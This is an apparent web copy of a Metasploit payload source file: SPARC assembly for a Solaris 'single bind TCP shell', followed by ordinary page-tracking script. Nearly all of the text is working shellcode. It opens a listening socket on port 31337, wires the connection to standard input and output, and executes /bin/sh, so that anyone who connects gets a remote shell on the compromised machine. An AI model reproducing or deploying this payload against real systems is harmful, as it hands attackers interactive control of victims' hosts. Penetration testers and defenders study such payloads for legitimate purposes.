<html><head><title>Solaris/sparc - Single bind TCP shell</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
##
#
#        Name: single_bind_tcp
#   Platforms: Solaris
#     Authors: vlad902 &lt;vlad902 [at] gmail.com&gt;
#     Version: $Revision: 1.2 $
#     License:
#
#        This file is part of the Metasploit Exploit Framework
#        and is subject to the same licenses and copyrights as
#        the rest of this package.
#
# Description:
#
#        Single bind TCP shell.
#
##

.globl main

main:
	andn	%sp, 7, %sp

	mov	1, %o4
	xor	%o3, %o3, %o3
	xor	%o3, %o3, %o2
	mov	0x02, %o1
	mov	0x02, %o0
	mov	0xe6, %g1
	ta	0x08

	st	%o0, [ %sp - 0x08 ]

#ifndef NO_NULLS
	set	0x00027a68, %l0
#else
	set	0x27a68fff, %l0
	srl	%l0, 12, %l0
#endif
	st	%l0, [ %sp - 0x10 ]
	st	%g0, [ %sp - 0x0c ]
	sub	%sp, 16, %o1
	mov	0x10, %o2
	mov	0xe8, %g1
	ta	0x08

	ld	[ %sp - 0x08 ], %o0
	mov	0x01, %o1
	mov	0xe9, %g1
	ta	0x08

	ld	[ %sp - 0x08 ], %o0
	xor	%o1, %o1, %o1
	or	%o1, %o1, %o2
	mov	0xea, %g1
	ta	0x08

	st	%o0, [ %sp - 0x08 ]
	mov	3, %o2
fcntl_loop:
	mov	9, %o1
	subcc	%o2, 1, %o2
	mov	0x3e, %g1
	ta	0x08

	bnz	fcntl_loop
	ld	[ %sp - 0x08 ], %o0

	xor	%o3, %o3, %o2
	set	0x2f62696e, %l0
	set	0x2f736800, %l1
	sub	%sp, 0x10, %o0
	sub	%sp, 0x08, %o1
	std	%l0, [ %sp - 0x10 ]	
	st	%o0, [ %sp - 0x08 ]
	st	%g0, [ %sp - 0x04 ]
	mov	0x3b, %g1
	ta	0x08


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
